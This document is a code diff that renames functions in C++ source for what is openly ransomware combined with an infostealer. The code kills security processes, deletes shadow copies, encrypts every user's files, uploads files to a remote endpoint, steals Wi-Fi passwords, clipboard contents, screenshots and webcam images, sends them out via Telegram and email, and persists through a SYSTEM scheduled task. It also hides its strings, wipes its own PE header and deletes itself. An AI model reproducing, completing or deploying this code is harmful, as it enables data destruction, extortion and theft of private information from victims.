@@ -13,7 +13,7 @@ vector<string> filesLink;
 vector<string> globalAllFiles;
 mutex allFilesMutex;
 
-string exec(const char* cmd) {
+string Exec(const char* cmd) {
     string result = (string)skCrypt("");
     FILE* CommandResult = _popen(cmd, skCrypt("rt"));
     char line[256];
@@ -23,11 +23,11 @@ string exec(const char* cmd) {
     return result;
 }
 
-string powershellEncodedCommand(string cmd) {
-    return (string)skCrypt("powershell -enCoDEdcOmmAnD ") + exec(((string)skCrypt("powershell [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\\"") + cmd + (string)skCrypt("\\\"))")).c_str());
+string PowershellEncodedCommand(const string& cmd) {
+    return (string)skCrypt("powershell -enCoDEdcOmmAnD ") + Exec(((string)skCrypt("powershell [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\\"") + cmd + (string)skCrypt("\\\"))")).c_str());
 }
 
-bool copy_file(const char* From, const char* To) {
+bool Copyfile(const char* From, const char* To) {
     size_t MaxBufferSize = 1048576;
     ifstream is(From, ios_base::binary);
     ofstream os(To, ios_base::binary);
@@ -49,14 +49,14 @@ bool copy_file(const char* From, const char* To) {
     return false;
 }
 
-DWORD trojanFunction(LPVOID params_useless) {
+DWORD TrojanFunction(LPVOID params) {
     this_thread::sleep_for(6500ms);
     if (DROPRUN_TROJAN_FILE)
         system((TROJANFILE).c_str());
     system(((string)skCrypt("start ") + (string)skCrypt("https://www.youtube.com/watch?v=dQw4w9WgXcQ")).c_str());   // just for fun and for tests - you can delete this line
 }
 
-DWORD removeTasks(LPVOID params_useless) {
+DWORD RemoveTasks(LPVOID params) {
     string check1 = (string)skCrypt("(get-process -ea SilentlyContinue '");
     string check2 = (string)skCrypt("') -eq $Null");
 
@@ -65,20 +65,19 @@ DWORD removeTasks(LPVOID params_useless) {
 
 	while (true) {
         for (string badProgram : badPrograms) {
-            if (exec(powershellEncodedCommand(check1 + badProgram + check2).c_str()) == (string)skCrypt("False\n"))
-                system(powershellEncodedCommand(kill1 + badProgram + kill2).c_str());
+            if (Exec(PowershellEncodedCommand(check1 + badProgram + check2).c_str()) == (string)skCrypt("False\n"))
+                system(PowershellEncodedCommand(kill1 + badProgram + kill2).c_str());
         }
 	}
 }
 
-void peHeaderDeleter() {
-    DWORD oldProtect = 0;
-    char* pBaseAddr = (char*)GetModuleHandle(NULL);
-    VirtualProtect(pBaseAddr, 4096, PAGE_READWRITE, &oldProtect);
-    SecureZeroMemory(pBaseAddr, 4096);
+void PEHeaderDeleter() {
+    char* baseAddr = (char*)GetModuleHandle(NULL);
+    VirtualProtect(baseAddr, 4096, PAGE_READWRITE, new DWORD(0));
+    SecureZeroMemory(baseAddr, 4096);
 }
 
-void imageSizeIncreaser() {
+void ImageSizeIncreaser() {
     PPEB pPeb = (PPEB)__readgsqword(0x60);
     PLIST_ENTRY inLoadOrderModuleList = (PLIST_ENTRY)pPeb->Ldr->Reserved2[1];
     PLDR_DATA_TABLE_ENTRY tableEntry = CONTAINING_RECORD(inLoadOrderModuleList, LDR_DATA_TABLE_ENTRY, Reserved1[0]);
@@ -86,14 +85,14 @@ void imageSizeIncreaser() {
     *pEntrySizeOfImage = (ULONG)((INT_PTR)tableEntry->DllBase + 0x100000);
 }
 
-void getAllFiles(string username) {
+void GetAllFiles(const string& username) {
     vector<string> tmpFiles;
 
-    for (string file : split(exec(((string)skCrypt("dir /b /s /a-d C:\\Users\\") + username).c_str()), '\n'))
+    for (string file : Split(Exec(((string)skCrypt("dir /b /s /a-d C:\\Users\\") + username).c_str()), '\n'))
         tmpFiles.push_back(file);
 
     for (int i = 0; i < tmpFiles.size(); i++) {
-        vector<string> fileSplitted = split(tmpFiles[i], '.');
+        vector<string> fileSplitted = Split(tmpFiles[i], '.');
 
         for (string safeFile : safeFiles)
             if (safeFile == tmpFiles[i])
@@ -119,7 +118,7 @@ void getAllFiles(string username) {
     allFilesMutex.unlock();
 }
 
-int gettimeofday(struct timeval* tp, struct timezone* tzp) {
+int GetTimeOfDay(struct timeval* tp, struct timezone* tzp) {
     static const uint64_t EPOCH = ((uint64_t)116444736000000000ULL);
 
     SYSTEMTIME  system_time;
@@ -136,9 +135,9 @@ int gettimeofday(struct timeval* tp, struct timezone* tzp) {
     return 0;
 }
 
-string generateRandom(const int len) {
+string GenerateRandom(const int len) {
     timeval time;
-    gettimeofday(&time, NULL);
+    GetTimeOfDay(&time, NULL);
     const string alphanum = (string)skCrypt("UHGAX5r9eVJsiDMqSCN6QEgoPpvcW2fkyzhBl048dajFbxmIwuOT7KLYZn31tR");  // = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" but scrambled for more security against reverse
     string result;
     result.reserve(len);
@@ -149,13 +148,13 @@ string generateRandom(const int len) {
     return result;
 }
 
-vector<string> getFiles(string mainDir) {
+vector<string> GetFiles(const string& mainDir) {
     vector<string> result;
 
     if (DEBUG && !PathIsDirectoryEmptyA((LPCSTR)mainDir.c_str())) {
-        vector<string> files = split(exec(((string)skCrypt("dir /s /b /a-d ") + mainDir).c_str()), '\n');
+        vector<string> files = Split(Exec(((string)skCrypt("dir /s /b /a-d ") + mainDir).c_str()), '\n');
         for (string file : files) {
-            vector<string> fileSplitted = split(file, '.');
+            vector<string> fileSplitted = Split(file, '.');
 
             for (string safeFile : safeFiles)
                 if (safeFile == file)
@@ -179,13 +178,13 @@ vector<string> getFiles(string mainDir) {
 
     else {
         vector<thread> threads;
-        for (string user : split(exec(skCrypt("dir /b /ad C:\\Users")), '\n')) {
-            if (!fileExists((string)skCrypt("C:\\Users") + user))   /*directory does not exists (idk why)*/
+        for (string user : Split(Exec(skCrypt("dir /b /ad C:\\Users")), '\n')) {
+            if (!FileExists((string)skCrypt("C:\\Users") + user))   /*directory does not exists (idk why)*/
                 continue;
             if (PathIsDirectoryEmptyA((LPCSTR)((string)skCrypt("C:\\Users\\") + user).c_str()))   /*directory is empty*/
                 continue;
 
-            threads.push_back(thread(getAllFiles, user));
+            threads.push_back(thread(GetAllFiles, user));
         }
         for (int i = 0; i < threads.size(); i++)
             threads[i].join();
@@ -196,7 +195,7 @@ vector<string> getFiles(string mainDir) {
     return result;
 }
 
-vector<string> split(const string& s, char delimiter) {
+vector<string> Split(const string& s,const char& delimiter) {
     size_t start = 0;
     size_t end = s.find_first_of(delimiter);
     vector<string> output;
@@ -214,26 +213,26 @@ vector<string> split(const string& s, char delimiter) {
     return output;
 }
 
-bool fileExists(const string& name) {
+bool FileExists(const string& name) {
     struct stat buffer;
     return stat(name.c_str(), &buffer) == 0;
 }
 
-string getDate() {
+string GetDate() {
     auto timeNow = time(nullptr);
     ostringstream stream;
     stream << put_time(localtime(&timeNow), ((string)skCrypt("%d-%m-%Y %H:%M:%S")).c_str());
     return stream.str();
 }
 
-string getHWID() {
+string GetHWID() {
     HW_PROFILE_INFO hwProfileInfo;
     GetCurrentHwProfile(&hwProfileInfo);
     wstring ws(hwProfileInfo.szHwProfileGuid);
     return string(ws.begin(), ws.end());
 }
 
-string getIPData() {
+string GetIPData() {
     string result;
     URLDownloadToFileA(NULL, skCrypt("http://ipwho.is/"), (TEMPFILE).c_str(), 0, NULL);
     SetFileAttributesA((TEMPFILE).c_str(), FILE_ATTRIBUTE_HIDDEN);
@@ -249,7 +248,7 @@ string getIPData() {
     return result;
 }
 
-string getCPU() {
+string GetCPU() {
     string result = (string)skCrypt("");
     int cpuInfo[4] = { -1 };
     unsigned nExIds;
@@ -278,7 +277,7 @@ string getCPU() {
     return result;
 }
 
-string getGPU() {
+string GetGPU() {
     string result = (string)skCrypt("none");
     DISPLAY_DEVICE displayDevice = {sizeof(displayDevice), 0};
     if (EnumDisplayDevices(NULL, 0, &displayDevice, EDD_GET_DEVICE_INTERFACE_NAME)) {   /*it takes only the first gpu*/
@@ -288,7 +287,7 @@ string getGPU() {
     return result;
 }
 
-string getPcName() {
+string GetPcName() {
     string result = (string)skCrypt("none");
     TCHAR  infoBuf[1600];
     DWORD  bufCharCount = 1600;
@@ -300,7 +299,7 @@ string getPcName() {
     return result;
 }
 
-string getUserName() {
+string GetUsername() {
     string result = (string)skCrypt("none");
     TCHAR  infoBuf[1600];
     DWORD  bufCharCount = 1600;
@@ -312,7 +311,7 @@ string getUserName() {
     return result;
 }
 
-string getResolution() {
+string GetResolution() {
     RECT desktop;
     const HWND hDesktop = GetDesktopWindow();
     GetWindowRect(hDesktop, &desktop);
@@ -321,7 +320,7 @@ string getResolution() {
     return stream.str();
 }
 
-string getWinVersion() {
+string GetWinVersion() {
     string result = (string)skCrypt("none");
     if (IsWindowsXPOrGreater())
         result = (string)skCrypt("XP / Vista");
@@ -340,14 +339,14 @@ string getWinVersion() {
     return result;
 }
 
-string getLanguage() {
+string GetLanguage() {
     char buf[10];
     return string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO639LANGNAME, buf, sizeof(buf)) - 1) + 
           (string)skCrypt("-") + 
            string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO3166CTRYNAME, buf, sizeof(buf)));
 }
 
-string getClipboard() {
+string GetClipboard() {
     string result = (string)skCrypt("none");
     if (!OpenClipboard(nullptr))
         return result;
@@ -366,16 +365,16 @@ string getClipboard() {
     return result;
 }
 
-string getWifi() {
+string GetWifi() {
     bool directoryCreated = false;
     if (!fs::is_directory(WIFI_PATH) || !fs::exists(WIFI_PATH)) {
         fs::create_directory(WIFI_PATH);
         directoryCreated = true;
     }
 
-    exec(((string)skCrypt("netsh wlan export profile folder=\"") + WIFI_PATH + (string)skCrypt("\\\" key=clear && cls")).c_str());
+    Exec(((string)skCrypt("netsh wlan export profile folder=\"") + WIFI_PATH + (string)skCrypt("\\\" key=clear && cls")).c_str());
 
-    vector<string> wifiFiles = split(exec(((string)skCrypt("dir /s /b /a-d ") + WIFI_PATH).c_str()), '\n');
+    vector<string> wifiFiles = Split(Exec(((string)skCrypt("dir /s /b /a-d ") + WIFI_PATH).c_str()), '\n');
 
     string result = (string)skCrypt("");
     bool first = true;
@@ -412,7 +411,7 @@ string getWifi() {
     return result;
 }
 
-string getScreenshot() {
+string GetScreenshot() {
     string filename = TEMPFILE + (string)skCrypt(".bmp");
     string filename2 = TEMPFILE + (string)skCrypt(".jpg");
 
@@ -471,16 +470,16 @@ string getScreenshot() {
     return result;
 }
 
-vector<string> getLinks() {
+vector<string> GetLinks() {
     return filesLink;
 }
 
-vector<string> getWebcams() {
+vector<string> GetWebcams() {
     return webcams;
 }
 
-void sendEmail() {
-    system(powershellEncodedCommand(
+void SendEmail() {
+    system(PowershellEncodedCommand(
         (string)skCrypt("seND-mAilmeSSaGE -frOM '") + SENDERMAIL +
         (string)skCrypt("' -tO '") + RECEIVERMAIL +
         (string)skCrypt("' -SuBJect '") + EMAILSUBJECT +
@@ -492,34 +491,34 @@ void sendEmail() {
     ).c_str());
 }
 
-void dropFile(string content, string path) {
+void DropFile(const string& content,const string& path) {
     ofstream fout(path, ios::binary | ios::out);
     vector<BYTE> write = base64_decode(content);
     fout.write((const char*)&write[0], write.size());
 }
 
-void changeWallpaper(string content) {
+void ChangeWallpaper(const string& content) {
     ofstream fout(NEWWALLPAPER, ios::binary | ios::out);
     vector<BYTE> write = base64_decode(content);
     fout.write((const char*)&write[0], write.size());
     fout.close();
-    if (!copy_file(((string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles\\") + split(exec(skCrypt("dir /b %AppData%\\Microsoft\\Windows\\Themes\\CachedFiles")), '\n')[0]).c_str(), (OLDWALLPAPER).c_str()) && DEBUG)
+    if (!Copyfile(((string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles\\") + Split(Exec(skCrypt("dir /b %AppData%\\Microsoft\\Windows\\Themes\\CachedFiles")), '\n')[0]).c_str(), (OLDWALLPAPER).c_str()) && DEBUG)
         cout << skCrypt("Wallpaper not copied!\n\n");
 
     USES_CONVERSION_EX;
     SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, A2W_EX((NEWWALLPAPER).c_str(), (NEWWALLPAPER).length()), SPIF_UPDATEINIFILE);
 }
 
-bool isConnected2Internet() {
+bool IsConnected2Internet() {
     return InternetCheckConnection(CA2W(skCrypt("http://www.google.com/")), FLAG_ICC_FORCE_CONNECTION, 0);
 }
 
-void scheduleTask() {
+void ScheduleTask() {
     system(((string)skCrypt("schtasks /delete /f /tn \"") + TASKNAME + (string)skCrypt("\"")).c_str());
     system(((string)skCrypt("schtasks /create /sc minute /mo ") + MINUTES + (string)skCrypt(" /f /ru \"SYSTEM\" /tn \"") + TASKNAME + (string)skCrypt("\" /tr \"powershell -noprofile -executionpolicy bypass -file '") + EMAILSENDER + (string)skCrypt("'\"")).c_str());
 }
 
-vector<vector<string>> vectorSplitter(vector<string> baseVector, int parts) {
+vector<vector<string>> VectorSplitter(const vector<string>& baseVector, int parts) {
     vector<vector<string>> result;
     int length = baseVector.size() / parts;
     int remain = baseVector.size() % parts;
@@ -532,15 +531,15 @@ vector<vector<string>> vectorSplitter(vector<string> baseVector, int parts) {
     return result;
 }
 
-void deleteRestorePoints() {
-    system(powershellEncodedCommand((string)skCrypt("vssadmin delete shadows /all /quiet")).c_str());
+void DeleteRestorePoints() {
+    system(PowershellEncodedCommand((string)skCrypt("vssadmin delete shadows /all /quiet")).c_str());
 }
 
-void deleteMe(string myPath) {
+void DeleteMe(const string& myPath) {
     system(( (string)(char*)calloc(myPath.length() + 11, sizeof(char)) + (string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"") ).c_str());
 }
 
-void encryptFiles(vector<string> files, string key) {
+void EncryptFiles(const vector<string>& files,const string& key) {
     for (string file : files) {
 
         HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -564,11 +563,11 @@ void encryptFiles(vector<string> files, string key) {
     }
 }
 
-void uploadFiles(vector<string> files) {
+void UploadFiles(const vector<string>& files) {
     for (string file : files) {
-        string boundary = (string)skCrypt("$$") + generateRandom(32) + (string)skCrypt("$$");
+        string boundary = (string)skCrypt("$$") + GenerateRandom(32) + (string)skCrypt("$$");
         string header = (string)skCrypt("Content-Type: multipart/form-data; boundary=") + boundary;
-        string beggining = (string)skCrypt("--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"file\"; filename=\"") + split(file, '\\').back() + (string)skCrypt("\"\r\nContent-Type: application/octet-stream\r\n\r\n");
+        string beggining = (string)skCrypt("--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"file\"; filename=\"") + Split(file, '\\').back() + (string)skCrypt("\"\r\nContent-Type: application/octet-stream\r\n\r\n");
         string ending = (string)skCrypt("\r\n--") + boundary + (string)skCrypt("--\r\n");
         string userAgent = (string)skCrypt("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36,gzip(gfe)");
 
@@ -620,7 +619,7 @@ void uploadFiles(vector<string> files) {
     }
 }
 
-void createAndSetRegKey(HKEY key, string keyPath, string keyName, string value) {
+void CreateAndSetRegKey(HKEY key, string keyPath, string keyName, string value) {
     HKEY hKey;
     DWORD dwDisposition;
     if (RegCreateKeyEx(key, CA2T(keyPath.c_str()), 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS && DEBUG)
@@ -637,7 +636,7 @@ void createAndSetRegKey(HKEY key, string keyPath, string keyName, string value) 
         cout << key << skCrypt("\\") << keyPath << skCrypt(" not closed\n");
 }
 
-void takeWebcams() {
+void TakeWebcams() {
     HRESULT hr;
     ICreateDevEnum* pDevEnum = NULL;
     IEnumMoniker* pEnum = NULL;
@@ -870,14 +869,14 @@ cleanup:
 
 
     for (string file : filenames) {
-        string file2 = split(split(file, '\\').back(), '.')[0] + (string)skCrypt(".jpg");
+        string file2 = Split(Split(file, '\\').back(), '.')[0] + (string)skCrypt(".jpg");
         CImage Cimage;
         HRESULT res = Cimage.Load((const wchar_t*)wstring(file.begin(), file.end()).c_str());
         Cimage.Save((const wchar_t*)wstring(file2.begin(), file2.end()).c_str());
 
         ifstream webcamFile(file2, ios::in | ios::binary);
         vector<BYTE> data(istreambuf_iterator<char>(webcamFile), {});
-        webcams.push_back(split(file2, '\\').back() + (string)skCrypt(" ") + base64_encode(&data[0], data.size()));
+        webcams.push_back(Split(file2, '\\').back() + (string)skCrypt(" ") + base64_encode(&data[0], data.size()));
         webcamFile.close();
 
         if (remove(file.c_str()) != 0)
@@ -892,27 +891,27 @@ cleanup:
     return;
 }
 
-void changeIcon() {
+void ChangeIcon() {
     string progId = "";
     for (int i = 1; i < (FILE_EXTENSION).length(); i++)
         progId += towlower((FILE_EXTENSION)[i]);
     progId += skCrypt("file");
 
-    createAndSetRegKey(HKEY_CURRENT_USER, 
+    CreateAndSetRegKey(HKEY_CURRENT_USER, 
         (string)skCrypt("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\") + FILE_EXTENSION + (string)skCrypt("\\UserChoice"),
         (string)skCrypt("ProgId"), progId);
-    createAndSetRegKey(HKEY_CLASSES_ROOT, FILE_EXTENSION, (string)skCrypt("NULL"), progId);
-    createAndSetRegKey(HKEY_CLASSES_ROOT, progId + (string)skCrypt("\\DefaultIcon"), (string)skCrypt("NULL"), FILESICON);
+    CreateAndSetRegKey(HKEY_CLASSES_ROOT, FILE_EXTENSION, (string)skCrypt("NULL"), progId);
+    CreateAndSetRegKey(HKEY_CLASSES_ROOT, progId + (string)skCrypt("\\DefaultIcon"), (string)skCrypt("NULL"), FILESICON);
 
-    exec(((string)skCrypt("assoc ") + FILE_EXTENSION + (string)skCrypt("=") + progId).c_str());
+    Exec(((string)skCrypt("assoc ") + FILE_EXTENSION + (string)skCrypt("=") + progId).c_str());
 }
 
-void sendTelegramInfo() {
-    string boundary = (string)skCrypt("$$") + generateRandom(32) + (string)skCrypt("$$");
+void SendTelegramInfo() {
+    string boundary = (string)skCrypt("$$") + GenerateRandom(32) + (string)skCrypt("$$");
     string header = (string)skCrypt("Content-Type: multipart/form-data; boundary=") + boundary;
     string beggining = (string)skCrypt("--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n") + CHAT_ID +
-        (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n") + getHWID() +
-        (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"document\"; filename=\"") + split(INFOFILE, '\\').back() + (string)skCrypt("\"\r\nContent-Type: text/plain\r\n\r\n");
+        (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n") + GetHWID() +
+        (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"document\"; filename=\"") + Split(INFOFILE, '\\').back() + (string)skCrypt("\"\r\nContent-Type: text/plain\r\n\r\n");
     string ending = (string)skCrypt("\r\n--") + boundary + (string)skCrypt("--\r\n");
     string userAgent = (string)skCrypt("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36,gzip(gfe)");
 
